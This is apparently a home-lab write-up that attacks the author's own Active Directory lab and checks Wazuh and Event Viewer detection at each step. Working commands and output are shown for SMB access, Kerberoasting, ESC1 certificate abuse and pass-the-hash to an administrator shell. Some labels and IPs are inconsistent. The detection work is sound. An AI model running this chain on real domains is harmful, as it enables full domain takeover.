HOME LAB - header add a aski art 
this is the Map of my set up :

```
claude do it make it look fancy
```

soo...

i have used a selfmade lab called 'Control' for this project : [LAB_link](https://github.com/Aditya-k-Jangid/Labs_To_3xploit/tree/main/Control) (feel free to use it urself)
and for the attacker machine im using kali , can use parot as well but i prefer kali 
and used ubuntu as the Wazha server 

Quick setup:

For attacker machine - use lab if u have one , and if u dont use control like me , setup guide : [here](https://github.com/Aditya-k-Jangid/Labs_To_3xploit/blob/main/Control/README.md) 
for attacker machine :
- steps like install iso , vmware install it add to the same network , install required tools and more
for wazha server : use this for the setup : [Here](https://github.com/Aditya-k-Jangid/Home_lab/blob/main/Wazha_setup.md) 

basic test : 
ping test from all the machines 
wazasetup 
DC01 is all set up as well 
more 


now that we are done lets begin with the attack ,


1. Nmap scan :

```
 nmap -sS -sV -T4 192.168.29.244 
```

O/P:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 10:29:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

now lets check if the Wazuh captured this scan : GO to Threat hunting 

<img width="2530" height="1257" alt="image" src="https://github.com/user-attachments/assets/1afcd62d-023f-4eba-8011-be2dea813e1e" />

now : Event Tap > in the filter bar : rule.id:100021 

<img width="2533" height="1485" alt="image" src="https://github.com/user-attachments/assets/8167fe6b-35f5-4cff-9e35-1ffd5db22e5e" />

The scan was captured , 

2. now lets do ananymous login into the smb and capture the packets via eventviewer (u can also use wazuh if required)

```
smbclient //192.168.29.244/Del_me -U '' -N -c 'get Info.sqlite3'                                              
getting file \Info.sqlite3 of size 16384 as Info.sqlite3 (1230.8 KiloBytes/sec) (average 1230.8 KiloBytes/sec)
```

Open EventViewer > windows logs > Security > Filter current logs > set event id:4634 

<img width="404" height="416" alt="Screenshot 2026-07-30 174317" src="https://github.com/user-attachments/assets/f1bdc10c-f54d-46ce-8236-a6e3349db798" />

then view all the logs captured :

<img width="1041" height="636" alt="Screenshot 2026-07-30 174013" src="https://github.com/user-attachments/assets/c7fc2851-9444-4adf-ae41-57cc05c80fa7" />

To get more info about a perticular packet just click it and view the details: (like the source ip 192.168.29.245 and others info)


3. now after getting the password of 'John Willium' : j0hn who has genericwrite over mango , Orange lets abuse it and captue logs , 

<img width="443" height="560" alt="Screenshot 2026-07-30 175402" src="https://github.com/user-attachments/assets/8aa2080f-9826-45f7-a075-b09594f2e737" />


4. before anything the user orange is Deleted lets restore it 1st :

```
 bloodyAD -u 'John Willium' -p 'j0hn' -d xyz.com --host DC01.xyz.com --dc-ip 192.168.29.244 set restore Orange
[+] Orange has been restored successfully under CN=Orange,CN=Users,DC=xyz,DC=com
```

<img width="2530" height="1249" alt="image" src="https://github.com/user-attachments/assets/b57dfbc9-fe2e-4ad0-9ab6-60b663cf6c1f" />

the event got captured , lets view the details :

<img width="1231" height="1147" alt="image" src="https://github.com/user-attachments/assets/e0e4aa24-77b2-4b4a-86fb-d9aa20aebed7" />

as we can see the Targeted user is Orange , the and the User who performed action was John Willium , the ip is 192.168.29.244 which is my attacker machine 

5. now we gotta abuse the Generic all on the user Orange and Perform a Asrep-rosting attack

lets set a fake spn:
```
bloodyAD --host 192.168.29.244 -d xyz.com -u 'John willium' -p 'j0hn' \                                                                            
  set object 'CN=Orange,CN=Users,DC=xyz,DC=com' servicePrincipalName -v 'fake/orange.xyz.com'

[+] CN=Orange,CN=Users,DC=xyz,DC=com's servicePrincipalName has been updated
```

now lets request the spn so we can crack it:

```
GetUserSPNs.py xyz.com/'John willium':'j0hn' -dc-ip 192.168.29.244 -request -outputfile orange_hash.txt                                            ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
/home/sawsage/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name    MemberOf                              PasswordLastSet             LastLogon  Delegation
--------------------  ------  ------------------------------------  --------------------------  ---------  ----------
fake/orange.xyz.com   Orange  CN=Pentesters,CN=Users,DC=xyz,DC=com  2026-08-01 22:34:34.722759  <never>
```

<img width="2536" height="1351" alt="image" src="https://github.com/user-attachments/assets/b0347120-2033-43aa-ac40-a9a850c8c471" />

we can see the event was captured , now lets view more details 

<img width="1236" height="1425" alt="image" src="https://github.com/user-attachments/assets/0b533bd0-3908-4890-9427-cb3edcb1358e" />

we can see the request is from the attacker ip : 192.168.29.244 and other detials are present as well

after cracking the ticket offline the Attacker obtains `Orange:secret2!` now the attacker has access to a User who is in the RemoteManagementUsers meaning he can access the machine Remotly via Winrm , now the next step which the attacker takes is Priv-Esc , the Target is vaulnerabel to ESC1 attack which lets a Low privileged user (Like:Orange) ask for a certificate of high privieged USer like (administrator)  , now lets perform this attack and see if the Wazuh captures it or not

```
certipy-ad req -u 'Orange@xyz.com' -p 'secret2!' \                                                                                                 ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
  -target 192.168.29.244 \
  -ca 'DC01-CA' \
  -template 'Workstation-Enrollment-Prod' \
  -upn 'administrator@xyz.com'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@xyz.com'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

the certificate is captured , lets take a look at wazuh:

1st. cert requested logs:

<img width="2539" height="1272" alt="image" src="https://github.com/user-attachments/assets/2761ebeb-cdbb-43b1-9bcd-10e8636e3e17" />

<img width="1282" height="1236" alt="image" src="https://github.com/user-attachments/assets/70378ad0-9202-43bd-b78c-a593f45536e2" />

then the Cert Provided logs :

<img width="2545" height="1315" alt="image" src="https://github.com/user-attachments/assets/28332218-6bef-48ff-8059-00ce60f7241c" />

<img width="1219" height="1423" alt="image" src="https://github.com/user-attachments/assets/1d7b9df2-87f6-4230-8896-380b9717331c" />

now lets ask the dc for the hash/TGT with the cert we acquired : 

```
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.29.244                                                                                       ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@xyz.com'
[*] Using principal: 'administrator@xyz.com'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@xyz.com': aad3b435b51404eeaad3b435b51404ee:0aa71e2167b6136dd8e4b17ed9fd8f91
```

<img width="2533" height="958" alt="image" src="https://github.com/user-attachments/assets/c3323559-431b-4744-955d-31e9093463be" />

<img width="1258" height="1252" alt="image" src="https://github.com/user-attachments/assets/4271fb6b-1e8c-45b4-8990-e3ab4fa4f41b" />

we have Secuessfully obtained the ntlm hash of the administrator now lets perform the Pass_The_hash attack so we can access the desctop of administrator:

```
 evil-winrm -i xyz.com -u 'Administrator' -H '0aa71e2167b6136dd8e4b17ed9fd8f91'                                                                     ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
xyz\administrator

as we can see we now have access to the Administrator one of the most high privileged user 
```


